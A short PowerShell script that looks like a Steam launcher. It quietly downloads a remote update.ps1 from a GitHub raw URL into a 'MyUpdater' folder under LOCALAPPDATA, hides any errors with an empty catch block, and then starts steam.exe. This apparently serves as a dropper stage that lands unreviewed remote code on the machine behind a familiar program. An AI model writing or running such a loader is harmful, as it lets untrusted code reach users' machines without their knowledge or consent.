$repoUrl = "https://raw.githubusercontent.com/discosoupy/update/refs/heads/main/update.ps1"
$localFolder = "$env:LOCALAPPDATA\MyUpdater"
$localPath = "$localFolder\update.ps1"


try {
    if (!(Test-Path $localFolder)) {
        New-Item -ItemType Directory -Path $localFolder -Force | Out-Null
    }

    Invoke-WebRequest -Uri $repoUrl -OutFile $localPath -UseBasicParsing
}
catch {
   
}


Start-Process "steam.exe"

